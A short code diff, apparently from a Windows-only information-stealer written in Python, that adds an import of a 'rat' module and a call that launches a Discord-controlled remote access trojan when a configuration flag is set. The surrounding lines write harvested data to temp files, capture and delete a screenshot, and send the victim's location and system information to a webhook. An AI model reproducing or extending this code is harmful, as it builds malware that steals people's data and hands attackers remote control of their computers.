@@ -6,6 +6,8 @@ import _webhook
 _webh = _webhook.WebhookX()
 from configuration import Config 
 cc = Config()
+import rat 
+
 try:
     import os
     import threading
@@ -35,7 +37,6 @@ except:
 
 if platform.system() != "Windows":
     quit()
-
 
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
@@ -944,3 +945,6 @@ files["screenshot"].close()
 os.remove("screenshot.png")
 
 _webh.locations_webhook(ii.global_info())
+
+if cc.get_discord_rat() is True:
+    rat.run_rat()
